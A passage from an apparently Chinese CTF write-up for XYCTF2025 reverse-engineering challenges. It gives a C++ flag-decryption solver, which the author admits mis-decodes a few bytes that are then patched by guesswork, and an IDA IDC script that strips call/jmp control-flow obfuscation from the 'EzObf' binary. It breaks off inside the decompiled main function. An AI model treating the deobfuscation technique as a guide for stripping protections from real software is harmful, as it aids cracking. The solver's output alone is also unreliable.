class="number">1</span>] ^= <span class="number">5</span>;</span><br><span class="line">Input[<span class="number">27</span>] += <span class="number">14</span>;</span><br><span class="line">Input[<span class="number">25</span>] += <span class="number">3</span>;</span><br><span class="line">Input[<span class="number">26</span>] += <span class="number">4</span>;</span><br><span class="line">Input[<span class="number">4</span>] ^= <span class="number">8</span>;</span><br><span class="line">Input[<span class="number">3</span>] -= <span class="number">12</span>;</span><br><span class="line">Input[<span class="number">12</span>] += <span class="number">10</span>;</span><br><span class="line">Input[<span class="number">37</span>] -= <span class="number">2</span>;</span><br><span class="line">Input[<span class="number">32</span>] -= <span class="number">2</span>;</span><br><span class="line">Input[<span class="number">9</span>] -= <span class="number">12</span>;</span><br><span class="line">Input[<span class="number">26</span>] ^= <span class="number">5</span>;</span><br><span class="line">Input[<span class="number">4</span>] += <span class="number">13</span>;</span><br><span class="line">Input[<span class="number">8</span>] ^= <span class="number">15</span>;</span><br><span class="line">Input[<span class="number">10</span>] += <span class="number">14</span>;</span><br><span class="line">Input[<span class="number">16</span>] -= <span class="number">7</span>;</span><br><span class="line">Input[<span class="number">12</span>] -= <span class="number">7</span>;</span><br><span class="line">Input[<span class="number">34</span>] ^= <span class="number">8</span>;</span><br><span class="line">Input[<span class="number">21</span>] ^= <span class="number">10</span>;</span><br><span class="line">Input[<span class="number">39</span>] -= <span class="number">126</span>;</span><br><span class="line">Input[<span class="number">7</span>] += <span class="number">2</span>;</span><br><span class="line">Input[<span class="number">15</span>] ^= <span class="number">3</span>;</span><br><span class="line">Input[<span class="number">10</span>] ^= <span class="number">10</span>;</span><br><span class="line">Input[<span class="number">34</span>] -= <span class="number">11</span>;</span><br><span class="line">Input[<span class="number">18</span>] += <span class="number">8</span>;</span><br><span class="line">Input[<span class="number">25</span>] += <span class="number">9</span>;</span><br><span class="line">Input[<span class="number">14</span>] ^= <span class="number">6</span>;</span><br><span class="line">Input[<span class="number">0</span>] ^= <span class="number">5</span>;</span><br><span class="line">Input[<span class="number">10</span>] -= <span class="number">8</span>;</span><br><span class="line">Input[<span class="number">27</span>] ^= <span class="number">7</span>;</span><br><span class="line">Input[<span class="number">13</span>] ^= <span class="number">6</span>;</span><br><span class="line">Input[<span class="number">13</span>] ^= <span class="number">4</span>;</span><br><span class="line">Input[<span class="number">23</span>] ^= <span class="number">12</span>;</span><br><span class="line">Input[<span class="number">34</span>] ^= <span class="number">14</span>;</span><br><span class="line">Input[<span class="number">18</span>] += <span class="number">52</span>;</span><br><span class="line">Input[<span class="number">38</span>] -= <span class="number">119</span>;</span><br></pre></td></tr></table></figure><p>这也就是第一层加密的解密代码。</p><p>第二层加密直接对着写即可，我写的有点问题（懒得改），其中几个字节解密不对，不过根据解密出的flag也能猜出是啥，替换完那几个字节就得到完整的flag。</p><p>完整解密代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">decrypt_func</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *data, <span class="type">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> temp[<span class="number">40</span>];</span><br><span class="line">    <span class="built_in">memcpy</span>(temp, data, <span class="number">40</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> base = <span class="number">4</span> * i;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> block[<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (base &lt; len)</span><br><span class="line">        &#123;</span><br><span class="line">            block[<span class="number">0</span>] = ((temp[base + <span class="number">2</span>] &amp; <span class="number">0x1F</span>) &lt;&lt; <span class="number">5</span>) | (temp[base + <span class="number">3</span>] &gt;&gt; <span class="number">3</span>);</span><br><span class="line">            block[<span class="number">1</span>] = (temp[base] &gt;&gt; <span class="number">3</span>) | ((temp[base + <span class="number">3</span>] &amp; <span class="number">0x07</span>) &lt;&lt; <span class="number">5</span>);</span><br><span class="line">            block[<span class="number">2</span>] = ((temp[base] &amp; <span class="number">0x07</span>) &lt;&lt; <span class="number">5</span>) | (temp[base + <span class="number">1</span>] &gt;&gt; <span class="number">3</span>);</span><br><span class="line">            block[<span class="number">3</span>] = ((temp[base + <span class="number">1</span>] &amp; <span class="number">0x07</span>) &lt;&lt; <span class="number">5</span>) | (temp[base + <span class="number">2</span>] &gt;&gt; <span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span> &amp;&amp; base + j &lt; len; j++)</span><br><span class="line">            &#123;</span><br><span class="line">                data[base + j] = block[j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> Input[<span class="number">48</span>] = &#123;</span><br><span class="line">        <span class="number">0x4A</span>, <span class="number">0xAB</span>, <span class="number">0x9B</span>, <span class="number">0x1B</span>, <span class="number">0x61</span>, <span class="number">0xB1</span>, <span class="number">0xF3</span>, <span class="number">0x32</span>, <span class="number">0xD1</span>, <span class="number">0x8B</span>, <span class="number">0x73</span>, <span class="number">0xEB</span>, <span class="number">0xE9</span>, <span class="number">0x73</span>, <span class="number">0x6B</span>, <span class="number">0x22</span>,</span><br><span class="line">        <span class="number">0x81</span>, <span class="number">0x83</span>, <span class="number">0x23</span>, <span class="number">0x31</span>, <span class="number">0xCB</span>, <span class="number">0x1B</span>, <span class="number">0x22</span>, <span class="number">0xFB</span>, <span class="number">0x25</span>, <span class="number">0xC2</span>, <span class="number">0x81</span>, <span class="number">0x81</span>, <span class="number">0x73</span>, <span class="number">0x22</span>, <span class="number">0xFA</span>, <span class="number">0x03</span>,</span><br><span class="line">        <span class="number">0x9C</span>, <span class="number">0x4B</span>, <span class="number">0x5B</span>, <span class="number">0x49</span>, <span class="number">0x97</span>, <span class="number">0x87</span>, <span class="number">0xDB</span>, <span class="number">0x51</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">decrypt_func</span>(Input, <span class="number">40</span>);</span><br><span class="line">    Input[<span class="number">2</span>] += <span class="number">12</span>;</span><br><span class="line">    Input[<span class="number">26</span>] -= <span class="number">85</span>;</span><br><span class="line">    Input[<span class="number">35</span>] -= <span class="number">12</span>;</span><br><span class="line">    Input[<span class="number">14</span>] += <span class="number">9</span>;</span><br><span class="line">    Input[<span class="number">27</span>] -= <span class="number">6</span>;</span><br><span class="line">    Input[<span class="number">6</span>] ^= <span class="number">5</span>;</span><br><span class="line">    Input[<span class="number">1</span>] ^= <span class="number">5</span>;</span><br><span class="line">    Input[<span class="number">27</span>] += <span class="number">14</span>;</span><br><span class="line">    Input[<span class="number">25</span>] += <span class="number">3</span>;</span><br><span class="line">    Input[<span class="number">26</span>] += <span class="number">4</span>;</span><br><span class="line">    Input[<span class="number">4</span>] ^= <span class="number">8</span>;</span><br><span class="line">    Input[<span class="number">3</span>] -= <span class="number">12</span>;</span><br><span class="line">    Input[<span class="number">12</span>] += <span class="number">10</span>;</span><br><span class="line">    Input[<span class="number">37</span>] -= <span class="number">2</span>;</span><br><span class="line">    Input[<span class="number">32</span>] -= <span class="number">2</span>;</span><br><span class="line">    Input[<span class="number">9</span>] -= <span class="number">12</span>;</span><br><span class="line">    Input[<span class="number">26</span>] ^= <span class="number">5</span>;</span><br><span class="line">    Input[<span class="number">4</span>] += <span class="number">13</span>;</span><br><span class="line">    Input[<span class="number">8</span>] ^= <span class="number">15</span>;</span><br><span class="line">    Input[<span class="number">10</span>] += <span class="number">14</span>;</span><br><span class="line">    Input[<span class="number">16</span>] -= <span class="number">7</span>;</span><br><span class="line">    Input[<span class="number">12</span>] -= <span class="number">7</span>;</span><br><span class="line">    Input[<span class="number">34</span>] ^= <span class="number">8</span>;</span><br><span class="line">    Input[<span class="number">21</span>] ^= <span class="number">10</span>;</span><br><span class="line">    Input[<span class="number">39</span>] -= <span class="number">126</span>;</span><br><span class="line">    Input[<span class="number">7</span>] += <span class="number">2</span>;</span><br><span class="line">    Input[<span class="number">15</span>] ^= <span class="number">3</span>;</span><br><span class="line">    Input[<span class="number">10</span>] ^= <span class="number">10</span>;</span><br><span class="line">    Input[<span class="number">34</span>] -= <span class="number">11</span>;</span><br><span class="line">    Input[<span class="number">18</span>] += <span class="number">8</span>;</span><br><span class="line">    Input[<span class="number">25</span>] += <span class="number">9</span>;</span><br><span class="line">    Input[<span class="number">14</span>] ^= <span class="number">6</span>;</span><br><span class="line">    Input[<span class="number">0</span>] ^= <span class="number">5</span>;</span><br><span class="line">    Input[<span class="number">10</span>] -= <span class="number">8</span>;</span><br><span class="line">    Input[<span class="number">27</span>] ^= <span class="number">7</span>;</span><br><span class="line">    Input[<span class="number">13</span>] ^= <span class="number">6</span>;</span><br><span class="line">    Input[<span class="number">13</span>] ^= <span class="number">4</span>;</span><br><span class="line">    Input[<span class="number">23</span>] ^= <span class="number">12</span>;</span><br><span class="line">    Input[<span class="number">34</span>] ^= <span class="number">14</span>;</span><br><span class="line">    Input[<span class="number">18</span>] += <span class="number">52</span>;</span><br><span class="line">    Input[<span class="number">38</span>] -= <span class="number">119</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%.40s\n&quot;</span>, Input);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// flag&#123;L3@rn-ng_1n_0ld_sch00b_@nd_g3x_j0y&#125; -&gt; flag&#123;L3@rn1ng_1n_0ld_sch00l_@nd_g3t_j0y&#125;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>flag{L3@rn1ng_1n_0ld_sch00l_@nd_g3t_j0y}</p><h2 id="EzObf"><a href="#EzObf" class="headerlink" title="EzObf"></a>EzObf</h2><p>main_0函数跟入发现有混淆，红框处为原真实汇编指令，其他都是混淆指令。</p><p>混淆流程：</p><ol><li>执行真实指令</li><li>call $+5执行pop rax，rax就是call时push到栈的返回地址，也就是pop rax指令的地址。</li><li>给ebx赋值，进行rol计算，最后用rax加上或减去（共两种）rbx，得到跳转地址，进行jmp rax。</li></ol><p>之后每jmp过去一次，那边就都是一样的结构，popfq和pushfq之间就是真实汇编。</p><p>deobf的思路即为nop那一堆pop和push，保留真实汇编指令，然后计算跳转地址，手动计算相对地址写jmp，保持代码执行流程。</p><p><img src="/2025/04/07/XYCTF2025/43.png"></p><p>deobf idc脚本：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="title">NopCode</span><span class="params">(Addr, Length)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; Length; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">PatchByte</span>(Addr + i, <span class="number">0x90</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="title">rol</span><span class="params">(value, count, bits = <span class="number">32</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    count = count % bits;</span><br><span class="line">    <span class="keyword">return</span> ((value &lt;&lt; count) | (value &gt;&gt; (bits - count))) &amp; ((<span class="number">1</span> &lt;&lt; bits) - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 搜索真实汇编代码的下一个地址</span></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="title">FindEnd</span><span class="params">(Addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">0x90</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">auto</span> v = <span class="built_in">Dword</span>(Addr + i);</span><br><span class="line">        <span class="keyword">if</span> (v == <span class="number">0x5153509C</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> Addr + i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 搜索最后的jmp rax指令</span></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="title">FindJmpRax</span><span class="params">(Addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">0x90</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">auto</span> v = <span class="built_in">Word</span>(Addr + i);</span><br><span class="line">        <span class="keyword">if</span> (v == <span class="number">0xE0FF</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> Addr + i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 搜索call $+5</span></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="title">FindCall</span><span class="params">(Addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">0x90</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">auto</span> v = <span class="built_in">Dword</span>(Addr + i);</span><br><span class="line">        <span class="keyword">if</span> (v == <span class="number">0xE8</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> Addr + i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> StartAddr = <span class="number">0x1401F400D</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 搜索真实汇编代码的下一个指令地址</span></span><br><span class="line">        <span class="keyword">auto</span> EndAddr = <span class="built_in">FindEnd</span>(StartAddr);</span><br><span class="line">        <span class="keyword">if</span> (EndAddr == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 真实汇编代码的字节长度</span></span><br><span class="line">        <span class="keyword">auto</span> CodeLength = EndAddr - StartAddr - <span class="number">13</span>;</span><br><span class="line">        <span class="comment">// 搜索Call $+5</span></span><br><span class="line">        <span class="keyword">auto</span> CallAddr = <span class="built_in">FindCall</span>(StartAddr + <span class="number">13</span> + CodeLength);</span><br><span class="line">        <span class="keyword">if</span> (CallAddr == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// call $+5的下一条指令地址，即call时push到栈的返回地址</span></span><br><span class="line">        <span class="keyword">auto</span> CalcAddr = CallAddr + <span class="number">5</span>;</span><br><span class="line">        <span class="keyword">auto</span> ebx = <span class="built_in">Dword</span>(CalcAddr + <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">auto</span> rol_Value = <span class="built_in">Byte</span>(CalcAddr + <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">auto</span> Mode = <span class="built_in">Dword</span>(CalcAddr + <span class="number">9</span>);</span><br><span class="line">        ebx = <span class="built_in">rol</span>(ebx, rol_Value);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 搜索最尾部的jmp rax指令地址</span></span><br><span class="line">        <span class="keyword">auto</span> JmpRaxAddr = <span class="built_in">FindJmpRax</span>(StartAddr);</span><br><span class="line">        <span class="keyword">if</span> (JmpRaxAddr == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 第一部分垃圾指令长度</span></span><br><span class="line">        <span class="keyword">auto</span> TrushCodeLength_1 = CallAddr - (StartAddr + <span class="number">13</span> + CodeLength);</span><br><span class="line">        <span class="comment">// 第二部分垃圾指令长度</span></span><br><span class="line">        <span class="keyword">auto</span> TrushCodeLength_2 = JmpRaxAddr - CallAddr + <span class="number">2</span>;</span><br><span class="line">        <span class="comment">// Nop掉无用的所有代码</span></span><br><span class="line">        <span class="built_in">NopCode</span>(CallAddr, TrushCodeLength_2);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">NopCode</span>(StartAddr, <span class="number">13</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">NopCode</span>(StartAddr + <span class="number">13</span> + CodeLength, TrushCodeLength_1);</span><br><span class="line">        <span class="comment">// 一共两种地址计算，加和减</span></span><br><span class="line">        <span class="keyword">if</span> (Mode == <span class="number">0xffC32B48</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            CalcAddr = CalcAddr - ebx;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (Mode == <span class="number">0xffC30348</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            CalcAddr = CalcAddr + ebx;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">auto</span> JmpCodeAddr = EndAddr;</span><br><span class="line">        <span class="comment">// 计算相对跳转地址</span></span><br><span class="line">        <span class="keyword">auto</span> JmpOffset = CalcAddr - JmpCodeAddr + <span class="number">5</span>;</span><br><span class="line">        <span class="comment">// 写入jmp指令</span></span><br><span class="line">        <span class="built_in">PatchByte</span>(JmpCodeAddr, <span class="number">0xE9</span>);</span><br><span class="line">        <span class="built_in">PatchDword</span>(JmpCodeAddr + <span class="number">1</span>, JmpOffset);</span><br><span class="line">        <span class="comment">// jmp的地址为下一次deobf起始地址</span></span><br><span class="line">        StartAddr = CalcAddr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行完，把main_0剩余代码都手动nop即可。</p><p><img src="/2025/04/07/XYCTF2025/44.png"></p><p>然后Apply patches to input file，应用一下patch，重新打开ida载入程序分析。</p><p>从main_0的jmp进入两层到这边，然后用IDA Delete Function删除sub_1401F7B77函数，然后对jmp那边按E即可重新重构完main函数（如图2），F5即可分析。</p><p><img src="/2025/04/07/XYCTF2025/45.png"></p><p><img src="/2025/04/07/XYCTF2025/46.png"></p><p>Main函数原代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">main_0</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rbp</span></span><br><span class="line">  __int64 v4; <span class="comment">// rdi</span></span><br><span class="line">  __int64 i; <span class="comment">// rcx</span></span><br><span class="line">  _DWORD *v7; <span class="comment">// rdi</span></span><br><span class="line">  HANDLE CurrentProcess; <span class="comment">// rax</span></span><br><span class="line">  __int64 v9; <span class="comment">// [rsp-20h] [rbp-458h] BYREF</span></span><br><span class="line">  _DWORD v10[<span class="number">2</span>]; <span class="comment">// [rsp+0h] [rbp-438h] BYREF</span></span><br><span class="line">  _BYTE v11[<span class="number">64</span>]; <span class="comment">// [rsp+8h] [rbp-430h] BYREF</span></span><br><span class="line">  _BYTE *v12; <span class="comment">// [rsp+48h] [rbp-3F0h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v13; <span class="comment">// [rsp+64h] [rbp-3D4h]</span></span><br><span class="line">  <span class="type">int</span> v14; <span class="comment">// [rsp+84h] [rbp-3B4h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v15; <span class="comment">// [rsp+A4h] [rbp-394h]</span></span><br><span class="line">  <span class="type">int</span> v16; <span class="comment">// [rsp+C4h] [rbp-374h]</span></span><br><span class="line">  <span class="type">int</span> v17; <span class="comment">// [rsp+E4h] [rbp-354h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> k; <span class="comment">// [rsp+104h] [rbp-334h]</span></span><br><span class="line">  <span class="type">int</span> v19; <span class="comment">// [rsp+124h] [rbp-314h]</span></span><br><span class="line">  <span class="type">int</span> v20; <span class="comment">// [rsp+144h] [rbp-2F4h]</span></span><br><span class="line">  <span class="type">int</span> v21; <span class="comment">// [rsp+164h] [rbp-2D4h]</span></span><br><span class="line">  _DWORD v22[<span class="number">11</span>]; <span class="comment">// [rsp+188h] [rbp-2B0h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int16 v23; <span class="comment">// [rsp+1B4h] [rbp-284h]</span></span><br><span class="line">  BOOL v24; <span class="comment">// [rsp+1D4h] [rbp-264h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 j; <span class="comment">// [rsp+1F8h] [rbp-240h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v26; <span class="comment">// [rsp+218h] [rbp-220h]</span></span><br><span class="line">  _DWORD v27[<span class="number">12</span>]; <span class="comment">// [rsp+238h] [rbp-200h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 m; <span class="comment">// [rsp+268h] [rbp-1D0h]</span></span><br><span class="line">  <span class="type">int</span> v29; <span class="comment">// [rsp+3F4h] [rbp-44h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v30; <span class="comment">// [rsp+3F8h] [rbp-40h]</span></span><br><span class="line">  <span class="type">int</span> v31; <span class="comment">// [rsp+3FCh] [rbp-3Ch]</span></span><br><span class="line">  __int64 v32; <span class="comment">// [rsp+400h] [rbp-38h]</span></span><br><span class="line">  <span class="type">int</span> v33; <span class="comment">// [rsp+408h] [rbp-30h]</span></span><br><span class="line">  <span 